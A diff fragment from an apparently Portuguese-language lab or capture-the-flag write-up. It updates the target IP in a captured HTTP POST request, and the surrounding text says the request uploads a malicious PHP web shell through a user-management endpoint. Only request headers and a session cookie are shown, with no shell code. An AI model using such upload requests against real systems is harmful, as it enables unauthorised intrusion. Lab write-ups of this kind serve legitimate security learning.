@@ -167,7 +167,7 @@ E então,ao realizar o upload de um arquivo PHP malicioso contendo um web shell 
 ```
 
 POST /management/classes/Users.php?f=save HTTP/1.1
-Host: 10.10.153.42:445
+Host: 10.10.18.213:445
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
@@ -175,9 +175,9 @@ Accept-Encoding: gzip, deflate, br
 X-Requested-With: XMLHttpRequest
 Content-Type: multipart/form-data; boundary=---------------------------29210971036646702814293864180
 Content-Length: 6404
-Origin: http://10.10.153.42:445
+Origin: http://10.10.18.213:445
 Connection: keep-alive
-Referer: http://10.10.153.42:445/management/admin/?page=user/manage_user
+Referer: http://10.10.18.213:445/management/admin/?page=user/manage_user
 Cookie: PHPSESSID=nbh2n4pr4vhuqc4apnq6kgh1p2
 Priority: u=0
 
